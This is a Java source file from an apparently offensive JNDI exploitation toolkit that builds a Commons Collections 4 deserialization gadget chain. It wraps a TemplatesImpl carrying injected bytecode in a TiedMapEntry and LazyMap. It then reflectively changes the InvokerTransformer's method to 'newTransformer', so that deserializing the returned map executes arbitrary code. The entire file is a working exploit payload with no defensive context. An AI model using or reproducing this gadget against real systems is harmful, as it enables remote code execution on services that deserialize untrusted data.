package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Gadgets;
import com.qi4l.jndi.gadgets.utils.GadgetsYso;
import com.qi4l.jndi.gadgets.utils.Reflections;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

import static com.qi4l.jndi.Starter.JYsoMode;

@Dependencies({"commons-collections:commons-collections:4.0"})
public class commonscollectionsk2 implements ReleaseableObjectPayload<Object>{

    public Object getObject(PayloadType type, String... param) throws Exception {
        final Object templates;
        if (JYsoMode.contains("yso")) {
            templates = GadgetsYso.createTemplatesImpl(param[0]);
        } else {
            templates = Gadgets.createTemplatesImpl(type, param);
        }
        InvokerTransformer      transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        HashMap<String, String> innerMap    = new HashMap<String, String>();
        Map                     m           = LazyMap.lazyMap(innerMap, transformer);
        Map                     outerMap    = new HashMap();
        TiedMapEntry            tied        = new TiedMapEntry(m, templates);
        outerMap.put(tied, "t");
        // clear the inner map data, this is important
        innerMap.clear();

        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

        return outerMap;
    }

    @Override
    public void release(Object obj) throws Exception {

    }
}
